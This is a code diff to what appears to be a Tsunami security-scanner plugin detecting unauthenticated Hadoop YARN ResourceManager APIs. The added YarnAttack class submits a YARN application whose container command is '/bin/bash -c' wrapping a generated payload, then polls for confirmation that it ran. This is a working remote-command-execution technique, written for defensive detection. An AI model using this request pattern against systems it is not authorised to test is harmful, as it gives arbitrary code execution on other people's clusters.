@@ -23,20 +23,27 @@ import static com.google.tsunami.common.net.http.HttpRequest.post;
 import com.google.common.base.Ascii;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
-import com.google.gson.JsonElement;
+import com.google.gson.JsonObject;
+import com.google.gson.JsonPrimitive;
 import com.google.gson.JsonSyntaxException;
+import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
+import com.google.tsunami.common.net.http.HttpHeaders;
+import com.google.tsunami.common.net.http.HttpRequest;
 import com.google.tsunami.common.net.http.HttpResponse;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
+import com.google.tsunami.plugin.payload.Payload;
+import com.google.tsunami.plugin.payload.PayloadGenerator;
 import com.google.tsunami.proto.DetectionReport;
 import com.google.tsunami.proto.DetectionReportList;
 import com.google.tsunami.proto.DetectionStatus;
 import com.google.tsunami.proto.NetworkService;
+import com.google.tsunami.proto.PayloadGeneratorConfig;
 import com.google.tsunami.proto.Severity;
 import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.Vulnerability;
@@ -44,6 +51,7 @@ import com.google.tsunami.proto.VulnerabilityId;
 import java.io.IOException;
 import java.time.Clock;
 import java.time.Instant;
+import java.util.Optional;
 import javax.inject.Inject;
 
 /**
@@ -64,11 +72,20 @@ public final class YarnExposedManagerApiDetector implements VulnDetector {
 
   private final Clock utcClock;
   private final HttpClient httpClient;
+  private final PayloadGenerator payloadGenerator;
+
+  // polling parameters, 30 seconds altogether
+  // polling rate in milliseconds
+  private static final int POLLING_RATE = 1000;
+  // max number of polling attempts
+  private static final int POLLING_ATTEMPTS = 30;
 
   @Inject
-  public YarnExposedManagerApiDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
+  public YarnExposedManagerApiDetector(
+      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
+    this.payloadGenerator = checkNotNull(payloadGenerator);
   }
 
   @Override
@@ -117,59 +134,8 @@ public final class YarnExposedManagerApiDetector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
-    String targetUri =
-        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
-            + "ws/v1/cluster/apps/new-application";
-    logger.atInfo().log("Trying creating a new application on target '%s'", targetUri);
-    try {
-      HttpResponse response =
-          httpClient.send(post(targetUri).withEmptyHeaders().build(), networkService);
-      return response.status().isSuccess()
-          && response
-              .bodyJson()
-              .map(YarnExposedManagerApiDetector::bodyContainsApplicationId)
-              .orElse(false);
-    } catch (IOException e) {
-      logger.atWarning().withCause(e).log(
-          "Error creating new Hadoop application on target '%s'", targetUri);
-      return false;
-    } catch (JsonSyntaxException e) {
-      logger.atInfo().log(
-          "Hadoop Yarn NewApplication API response cannot be parsed as valid json. Maybe targeting"
-              + " an unexpected service?");
-      return false;
-    }
-  }
-
-  private static boolean bodyContainsApplicationId(JsonElement responseBody) {
-    if (!responseBody.isJsonObject()) {
-      logger.atInfo().log(
-          "Hadoop Yarn NewApplication API didn't respond with an expected json format.");
-      return false;
-    }
-    if (!responseBody.getAsJsonObject().has("application-id")) {
-      logger.atInfo().log(
-          "Hadoop Yarn NewApplication API response didn't contain application-id. Service not"
-              + " vulnerable.");
-      return false;
-    }
-
-    logger.atInfo().log(
-        "Plugin successfully created a new Hadoop application '%s' on scan target!",
-        responseBody.getAsJsonObject().getAsJsonPrimitive("application-id").getAsString());
-    // TODO(b/147455448): perform an out-of-band call on the target to verify.
-    // Send POST to /ws/v1/cluster/apps with payload:
-    // {
-    //   "application-id": "application-id-from-response-body",
-    //   "application-name": "tsunami-out-of-band",
-    //   "am-container-spec": {
-    //       "commands": {
-    //           "command": "nslookup scanner.out.of.band.target"
-    //       }
-    //   },
-    //   "application-type": "YARN"
-    // }
-    return true;
+    YarnAttack attacker = new YarnAttack(networkService);
+    return attacker.launch();
   }
 
   private DetectionReport buildDetectionReport(
@@ -189,7 +155,180 @@ public final class YarnExposedManagerApiDetector implements VulnDetector {
                     "Hadoop Yarn ResourceManager controls the computation and storage resources of"
                         + " a Hadoop cluster. Unauthenticated ResourceManager API allows any"
                         + " remote users to create and execute arbitrary applications on the"
-                        + " host."))
+                        + " host.")
+                .setRecommendation(
+                    "Set up authentication by following the instructions at"
+                        + " https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/HttpAuthentication.html."))
         .build();
+  }
+
+  // Helper method to create a new application-id.
+  // Returns null, if unsuccessful - instead of catch-and-rethrow
+  // this method is likely to be executed frequently
+  private String createNewAppId(NetworkService networkService) {
+    String appId = null;
+
+    String targetUri =
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
+            + "ws/v1/cluster/apps/new-application";
+    logger.atInfo().log("Trying creating a new application on target '%s'", targetUri);
+
+    try {
+      HttpResponse response =
+          httpClient.send(post(targetUri).withEmptyHeaders().build(), networkService);
+
+      if (response.status().isSuccess() && response.bodyJson().isPresent()) {
+        JsonObject jsonResponse = (JsonObject) response.bodyJson().get();
+        JsonPrimitive appIdPrimitive = jsonResponse.getAsJsonPrimitive("application-id");
+        if (appIdPrimitive != null) {
+          appId = appIdPrimitive.getAsString();
+
+          logger.atInfo().log(
+              "Plugin successfully created a new Hadoop application '%s' on scan target!", appId);
+
+        } else {
+          logger.atFine().log(
+              "Error creating new Hadoop application on target '%s', service did not return an"
+                  + " application-id",
+              targetUri);
+        }
+      }
+
+    } catch (ClassCastException e) {
+      logger.atFine().withCause(e).log(
+          "Error creating new Hadoop application on target '%s', unexpected response", targetUri);
+    } catch (IOException e) {
+      logger.atWarning().withCause(e).log(
+          "Error creating new Hadoop application on target '%s'", targetUri);
+    } catch (JsonSyntaxException e) {
+      logger.atInfo().log(
+          "Hadoop Yarn NewApplication API response cannot be parsed as valid json. Maybe targeting"
+              + " an unexpected service?");
+    } catch (IllegalStateException e) {
+      logger.atWarning().withCause(e).log(
+          "JSON object parsing error for target URI: '%s'.", targetUri);
+    }
+
+    return appId;
+  }
+
+  // Oneshot helper class to carry out the full attack against Yarn
+  private class YarnAttack {
+    private String appId;
+    private final NetworkService networkService;
+    private Payload tsunamiPayload;
+    private HttpRequest yarnRequest;
+
+    // networkService is the target service to attack
+    public YarnAttack(NetworkService networkService) {
+      this.networkService = networkService;
+    }
+
+    private void craftYarnCommandExecutionPayload() {
+
+      // Tell the PayloadGenerator what kind of vulnerability we are detecting so that it returns
+      // the best payload for that environment. See the proto definition to understand what these
+      // options mean.
+      PayloadGeneratorConfig config =
+          PayloadGeneratorConfig.newBuilder()
+              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
+              .setInterpretationEnvironment(
+                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+              .setExecutionEnvironment(
+                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+              .build();
+
+      // Pass in the config to get the actual payload from the generator.
+      // If the Tsunami callback server is configured, the generator will always try to return a
+      // callback-enabled payload.
+      tsunamiPayload = payloadGenerator.generate(config);
+
+      // tsunamiPayload.getPayload() returns the actual payload String. You may need to
+      // serialize/encode/format it to suit the specific vulnerability. Here, we inject it into a
+      // shell command.
+      String toBeExecuted = tsunamiPayload.getPayload();
+
+      JsonObject root = new JsonObject();
+      root.addProperty("application-id", appId);
+      root.addProperty("application-name", "get-shell");
+      root.addProperty("application-type", "YARN");
+      JsonObject commands = new JsonObject();
+      String cmd = String.format("/bin/bash -c '%s'", toBeExecuted);
+      commands.addProperty("command", cmd);
+      JsonObject amContainerSpec = new JsonObject();
+      amContainerSpec.add("commands", commands);
+      root.add("am-container-spec", amContainerSpec);
+
+      String jsonStr = root.toString();
+      ByteString yarnCompletePayload = ByteString.copyFromUtf8(jsonStr);
+
+      logger.atFine().log("Trying to execute via Yarn: %s", jsonStr);
+
+      HttpHeaders headersJsonContentType =
+          HttpHeaders.builder().addHeader("Content-Type", "application/json").build();
+
+      String targetUri =
+          NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "ws/v1/cluster/apps";
+
+      // Inject the payload into the vulnerable service
+      yarnRequest =
+          HttpRequest.post(targetUri)
+              .setHeaders(headersJsonContentType)
+              .setRequestBody(yarnCompletePayload)
+              .build();
+    }
+
+    private boolean mountAttack() {
+
+      try {
+        HttpResponse res = httpClient.send(yarnRequest, networkService);
+
+        // We can then validate whether the payload was executed using payload.checkWithExecuted. If
+        // so, the vulnerability is detected! Depending on the vulnerability type, checkIfExecuted
+        // may not need any input.
+        logger.atInfo().log(
+            "Yarn got http response: %s", res.status().isSuccess() ? "success" : "failure");
+        if (!res.status().isSuccess()) {
+          return false;
+        }
+
+        Optional<ByteString> resBody = res.bodyBytes();
+
+        // execution is asyncronous
+        logger.atInfo().log(
+            "Waiting for the Yarn payload to be executed asyncronously."
+                + " Timeout of the polling operation is %d ms.",
+            POLLING_RATE * POLLING_ATTEMPTS);
+
+        int attempts = 0;
+        while (true) {
+          if (tsunamiPayload.checkIfExecuted(resBody)) {
+            logger.atInfo().log("Yarn Tsunami payload was executed!");
+            return true;
+          }
+          attempts++;
+          if (attempts >= POLLING_ATTEMPTS) {
+            break;
+          }
+
+          Thread.sleep(POLLING_RATE);
+        }
+      } catch (IOException | InterruptedException e) {
+        // fine
+      }
+
+      return false;
+    }
+
+    public boolean launch() {
+      appId = createNewAppId(networkService);
+      if (appId == null) {
+        return false;
+      }
+
+      craftYarnCommandExecutionPayload();
+
+      return mountAttack();
+    }
   }
 }
